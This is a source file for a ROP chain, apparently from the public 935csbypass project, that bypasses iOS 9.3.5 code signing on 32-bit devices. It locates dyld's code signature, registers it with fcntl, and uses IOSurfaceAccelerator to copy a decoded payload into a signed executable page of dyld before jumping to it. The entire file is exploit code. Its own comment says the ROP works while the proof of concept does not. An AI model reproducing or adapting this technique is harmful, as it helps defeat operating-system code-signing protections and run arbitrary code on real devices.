// 935csbypass 32bit ROP implementation
// Yes, the ROP works. No, the POC does not. :P
//
// https://github.com/kpwn/935csbypass by @qwertyoruiop
//
// gcc -E rope.c | ropc -mrestack=$[0x26] -g -O2 -c dyld_shared_cache_armv7s | grep -v "^###" | sed 's|\\n\", 0$|", 10, 0|' > rope.asm

extern exit [[noreturn]];
extern __memcpy_chk;
extern fcntl;
extern mlock;
extern mmap;
extern mprotect;
extern munmap;
extern open;
extern pread;
extern printf;
extern syslog;
extern valloc;

extern CFShow;
extern CFDictionaryCreateMutable;
extern CFDictionarySetValue;
extern CFNumberCreate;
extern CFRelease;
extern __CFConstantStringClassReference;
extern kCFAllocatorDefault;
extern kCFTypeDictionaryKeyCallBacks;
extern kCFTypeDictionaryValueCallBacks;

extern IOSurfaceAcceleratorCreate;
extern IOSurfaceAcceleratorTransferSurface;
extern IOSurfaceCreate;
extern kIOSurfaceAllocSize;
extern kIOSurfaceBytesPerElement;
extern kIOSurfaceBytesPerRow;
extern kIOSurfaceHeight;
extern kIOSurfacePixelFormat;
extern kIOSurfaceWidth;

extern lzma_stream_buffer_decode;

#if 1
#define kCFAllocatorDefault *kCFAllocatorDefault// or just use NULL...
#else
#define kCFAllocatorDefault 0
#endif

#define kCFNumberSInt32Type 3
#define kCFNumberSInt64Type 4

#define O_RDONLY        0x0000          /* open for reading only */

#define F_ADDFILESIGS   61              /* add signature from same file (used by dyld for shared libs) */
#define F_ADDFILESIGS_RETURN    97      /* Add signature from same file, return end offset in structure on sucess */

#define MH_MAGIC        0xfeedface      /* the mach magic number */

#define LC_CODE_SIGNATURE 0x1d  /* local of code signature */

#define PAGE_SIZE       4096

#define PROT_READ       0x01    /* [MC2] pages can be read */
#define PROT_WRITE      0x02    /* [MC2] pages can be written */
#define PROT_EXEC       0x04    /* [MC2] pages can be executed */

#define MAP_PRIVATE     0x0002          /* [MF|SHM] changes are private */
#define MAP_ANON        0x1000  /* allocated from memory, swap space */
#define MAP_FILE        0x0000  /* map from file (default) */

volatile src = valloc(4096);
#if 0
__memcpy_chk(src, &payload, 8, -1);
#else
memlimit = { 0x20000000, 0 };
inPos = 0;
outPos = 0;
lzma_stream_buffer_decode(memlimit, 0, 0, &payload, &inPos, 56, src, &outPos, 4096);
#endif

_fd = fd_ = fd = open("/usr/lib/dyld", O_RDONLY);

// XXX I am pretty sure we'll find the magic eventually, so I skipped some sanity checks to KISS
off = -0x1000;
scan:
    off = off + 0x1000;
    [[stack]]pread(fd, &dyld_header, 0x4000, off, 0);
    hdr = &dyld_header;                         // XXX can't use *dyld_header here, because it'll think it's a pointer
    if (*hdr + -MH_MAGIC) goto scan;            // if (*dyld_header != MH_MAGIC) goto scan;
protmap = off;

// XXX I am pretty sure we'll find the command eventually, so I skipped some sanity checks to KISS
lc = &dyld_header + 28;                         // sizeof(struct mach_header)
cmds:
    if !(*lc + -LC_CODE_SIGNATURE) goto done;   // if (lc->cmd == LC_CODE_SIGNATURE) break;
    pcmdsize = lc + 4;                          // offsetof(cmdsize)
    lc = lc + *pcmdsize;
    goto cmds;
done:

psiginfo = siginfo = { 0, 0, 0, 0 };            // just to avoid volatile
*siginfo = off;                                 // siginfo.fs_file_start=off
__memcpy_chk(siginfo + 8, lc + 8, 8, -1);       // siginfo.fs_blob_start = (void*)codeSigCmd->dataoff; siginfo.fs_blob_size = codeSigCmd->datasize

result = fcntl(fd_, F_ADDFILESIGS_RETURN, psiginfo);
syslog(3, "Sigload %x\n", result);

width = 64;                                     // PAGE_SIZE / (16*4)
height = 16;
pitch = 256;                                    // width * 4
size = 4096;                                    // width * height * 4
bPE = 4;
pixelFormat = "ARGB";
volatile kIOSurfaceAddress = { __CFConstantStringClassReference, 0x7c8, "IOSurfaceAddress", 16 };

volatile dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
CFDictionarySetValue(dict, *kIOSurfaceBytesPerRow, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &pitch));
CFDictionarySetValue(dict, *kIOSurfaceBytesPerElement, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &bPE));
CFDictionarySetValue(dict, *kIOSurfaceWidth, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &width));
CFDictionarySetValue(dict, *kIOSurfaceHeight, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &height));
CFDictionarySetValue(dict, *kIOSurfacePixelFormat, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, pixelFormat));
CFDictionarySetValue(dict, *kIOSurfaceAllocSize, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &size));

IOSurfaceAcceleratorCreate(kCFAllocatorDefault, 0, &accel);

IOSurfaceAcceleratorTransferSurface(0,0,0,0,0,0,0);
mprotect(0,0,0);
mlock(0,0);
mmap(0,0,0,0,0,0);
IOSurfaceCreate(0);

src64 = { 0, 0 };
*src64 = src;
CFDictionarySetValue(dict, kIOSurfaceAddress, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, src64));
//CFShow(dict);
srcSurf_ = srcSurf = IOSurfaceCreate(dict);
volatile addr = mmap(0, PAGE_SIZE, PROT_READ + PROT_EXEC, MAP_FILE + MAP_PRIVATE, _fd, protmap);
//printf("addr = %x\n", addr);
mprotect(addr, PAGE_SIZE, PROT_READ + PROT_WRITE);
addr64 = { 0, 0 };
*addr64 = addr;
CFDictionarySetValue(dict, kIOSurfaceAddress, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, addr64));
//CFShow(dict);
destSurf_ = destSurf = IOSurfaceCreate(dict);
mprotect(addr, PAGE_SIZE, PROT_READ + PROT_EXEC);
mlock(addr, PAGE_SIZE);

if (IOSurfaceAcceleratorTransferSurface(accel, srcSurf, destSurf, 0, 0, 0, 0)) goto die;

CFRelease(destSurf_);
CFRelease(srcSurf_);

exit(addr());

die:
syslog(3, "fail\n");
exit(-1);
